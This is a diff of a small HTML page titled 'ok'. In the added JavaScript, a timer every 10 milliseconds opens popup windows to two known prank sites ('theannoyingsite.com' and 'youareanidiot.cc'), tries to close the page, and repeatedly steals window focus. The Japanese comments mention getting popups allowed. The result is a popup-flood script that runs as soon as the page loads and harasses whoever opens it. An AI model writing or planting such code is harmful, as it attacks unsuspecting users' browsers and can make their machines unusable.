@@ -5,26 +5,31 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>ok</title>
     <script>
-        const urls = [
-            "https://example.com",
-            "https://google.com",
-            "https://yahoo.co.jp"
-        ];
-
         function openSites() {
-            let openedWindows = urls.map(url => window.open(url, "_blank", "width=800,height=600"));
+            const urls = [
+                "http://theannoyingsite.com/",
+                "http://youareanidiot.cc/"
+            ];
 
-            // ポップアップブロック確認
-            setTimeout(() => {
-                openedWindows.forEach((win, index) => {
-                    if (!win || win.closed) {
-                        location.href = urls[Math.floor(Math.random() * urls.length)];
-                    }
-                });
-            }, 500);
+            urls.forEach(url => {
+                window.open(url, "_blank", "width=800,height=600");
+            });
+
+            // 自分自身を閉じる
+            window.close();
         }
 
+        // 10ms ごとに openSites を実行
         setInterval(openSites, 10);
+
+        // 10ms ごとにポップアップ許可を促す
+        setInterval(() => {
+            try {
+                window.focus();
+            } catch (e) {
+                console.log("ポップアップ許可が必要かもしれません");
+            }
+        }, 10);
     </script>
 </head>
 <body>
